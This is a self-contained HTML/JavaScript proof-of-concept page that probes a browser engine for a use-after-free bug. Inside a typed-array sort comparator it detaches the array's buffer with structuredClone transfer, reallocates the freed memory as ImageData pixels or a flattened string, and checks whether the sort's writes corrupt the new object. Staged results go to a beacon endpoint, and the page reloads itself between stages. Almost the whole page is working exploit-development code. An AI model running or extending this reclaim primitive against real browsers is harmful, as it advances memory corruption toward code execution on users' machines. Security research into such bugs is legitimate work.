<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1177 Sort-Write Reclaim Detector</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1177 — SORT-WRITE RECLAIM DETECTOR (ImageData)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1177-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1177: detect the detached-sort's WRITES into a live object that
   reclaims the freed backing store during the sort.
   ImageData(w,h) eagerly allocates a fastMalloc pixel buffer
   (4*w*h bytes) — readable after the sort via .data. If the sort's
   in-place writes land in the reclaimed slot, the pixels change.
   Stages:
   0: ImageData(16,16)=1024B reclaim during sort -> read .data after
   1: ImageData(8,32)=1024B variant
   2: flattened string reclaim (alloc + charCodeAt flatten in-comparator)
   3: ImageData(16,16) + double-length pattern targeting StringImpl later
   4: control: ImageData allocated BEFORE sort (should stay zero)
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['img16','img8x32','flatstr','pattern','control'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1177_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1177_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);
setCounters('prev: '+JSON.stringify(results).slice(0,400));

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1177_stage');}catch(e){}
}else{

try{localStorage.setItem('p1177_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep){
  results.push({stage:stage,name:cur,result:rep});
  try{localStorage.setItem('p1177_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');
  setTimeout(function(){location.reload(true);},700);
}

function imgSummary(img){
  var nz=0,sample=[];
  for(var i=0;i<img.data.length;i+=4){
    var r=img.data[i],g=img.data[i+1],b=img.data[i+2],a=img.data[i+3];
    if(r||g||b||a){nz++;
      if(sample.length<8)sample.push(i+':'+r+','+g+','+b+','+a);}
  }
  return 'nz='+nz+'/'+img.data.length+'|'+sample.join(' ');
}

/* sort-during-detach with an in-comparator reclaim */
function runImageReclaim(w,h,allocWhen){
  var ab=new ArrayBuffer(1024);
  var ta=new Uint8Array(ab);
  for(var i=0;i<ta.length;i++)ta[i]=(i*7)%251;
  var detached=false,allocDone=false;
  var img=(allocWhen==='pre')?new ImageData(w,h):null;
  var cmps=0;
  try{
    ta.sort(function(a,b){
      cmps++;
      if(!detached){
        detached=true;
        structuredClone(ab,{transfer:[ab]});
      }else if(!allocDone&&allocWhen==='during'){
        allocDone=true;
        img=new ImageData(w,h);
      }
      return a-b;
    });
  }catch(e){B('SORT-ERR',e.constructor.name+':'+String(e.message).slice(0,40));}
  var rep='?';
  if(img){try{rep=imgSummary(img);}catch(e){rep='ERR';}}
  return {detached:detached,cmps:cmps,rep:rep};
}

function runFlatStrReclaim(){
  var ab=new ArrayBuffer(1024);
  var ta=new Uint8Array(ab);
  for(var i=0;i<ta.length;i++)ta[i]=(i*7)%251;
  var detached=false,allocDone=false,str=null;
  try{
    ta.sort(function(a,b){
      if(!detached){detached=true;structuredClone(ab,{transfer:[ab]});}
      else if(!allocDone){
        allocDone=true;
        str='A'.repeat(1000);
        try{var f=str.charCodeAt(999);}catch(e){f='e';} /* force flatten */
      }
      return a-b;
    });
  }catch(e){B('SORT2-ERR',String(e.message).slice(0,40));}
  var rep='?';
  if(str!==null){try{rep='len='+str.length+'|c0='+str.charCodeAt(0)+'|c500='+str.charCodeAt(500);}catch(e){rep='ERR';}}
  return rep;
}

if(cur==='img16'){
  setPhase('ImageData(16,16) reclaim during sort');
  B('RUN','img16');
  var r0=runImageReclaim(16,16,'during');
  done('detached='+r0.detached+'|cmps='+r0.cmps+'|'+r0.rep);
}else if(cur==='img8x32'){
  setPhase('ImageData(8,32)');
  B('RUN','img8x32');
  var r1=runImageReclaim(8,32,'during');
  done('detached='+r1.detached+'|cmps='+r1.cmps+'|'+r1.rep);
}else if(cur==='flatstr'){
  setPhase('flattened string reclaim');
  B('RUN','flatstr');
  var r2=runFlatStrReclaim();
  done(r2);
}else if(cur==='pattern'){
  setPhase('ImageData + write pattern check');
  /* fill ta with a distinctive pattern; check WHICH values land in img */
  var ab3=new ArrayBuffer(1024);
  var ta3=new Uint8Array(ab3);
  for(var i3=0;i3<ta3.length;i3++)ta3[i3]=0xA5;
  var det3=false,al3=false,img3=null;
  try{
    ta3.sort(function(a,b){
      if(!det3){det3=true;structuredClone(ab3,{transfer:[ab3]});}
      else if(!al3){al3=true;img3=new ImageData(16,16);}
      return a-b;
    });
  }catch(e){B('SORT3-ERR',String(e.message).slice(0,40));}
  var rep3='?';
  if(img3){try{rep3=imgSummary(img3);}catch(e){rep3='ERR';}}
  done(rep3);
}else if(cur==='control'){
  setPhase('control: ImageData BEFORE sort');
  B('RUN','control');
  var r4=runImageReclaim(16,16,'pre');
  done('detached='+r4.detached+'|'+r4.rep);
}

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1177-write-detector';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
